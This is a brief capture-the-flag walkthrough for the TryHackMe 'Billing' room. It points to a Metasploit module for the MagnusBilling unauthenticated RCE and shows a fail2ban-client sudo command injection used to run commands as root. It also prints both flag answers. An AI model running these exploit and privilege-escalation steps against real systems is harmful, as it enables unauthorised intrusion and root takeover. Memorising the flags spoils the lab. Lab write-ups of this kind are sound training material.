**Room:** [https://tryhackme.com/room/billing](https://tryhackme.com/room/billing)

![](https://miro.medium.com/v2/resize:fit:875/1*p1n1ts_iMeiuqXjZFVXTAQ.png)

# Quick Hints for “Billing” Room

First, add the target IP to your `/etc/hosts` file as `billing.thm`. When you visit the IP in a browser, it automatically redirects to the application, but adding it to hosts helps with later steps.

Check `robots.txt` — you’ll find the path to the application there.

I ran `ffuf` with `common.txt` for directory fuzzing but found nothing interesting. However, searching Google for a CVE on the web app led me to a known exploit for MagnusBilling:  
[Rapid7 Exploit - magnusbilling_unauth_rce_cve_2023_30258](https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/)

They even have a Metasploit module ready to use:

msf > use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258

Just use it, and after exploiting, visit the shell and go to `/home/magnus`.

![](https://miro.medium.com/v2/resize:fit:875/1*QFu_IOXA054ngNGnzjtc-Q.png)

## Privilege Escalation

We’re allowed to run`fail2ban-client` as sudo. So, use it to execute commands as root and grab the root flag:

```
sudo /usr/bin/fail2ban-client restart  
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'"  
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1  
cat /tmp/root.txt
```

This copies the root flag to `/tmp/root.txt` with full permissions so you can read it easily.

![](https://miro.medium.com/v2/resize:fit:875/1*9-0zPKfYQ-UmHDkpA5X2uw.png)

**How I figured this out:**  
I used ChatGPT and referred to this detailed article for a better understanding: [https://juggernaut-sec.com/fail2ban-lpe/](https://juggernaut-sec.com/fail2ban-lpe/)

**What is user.txt?**

> THM{4a6831d5f124b25eefb1e92e0f0da4ca}

**What is root.txt?**

> THM{33ad5b530e71a172648f424ec23fae60}

![](https://miro.medium.com/v2/resize:fit:875/1*_FzeESyQcQ-3qDC_U2Rksg.png)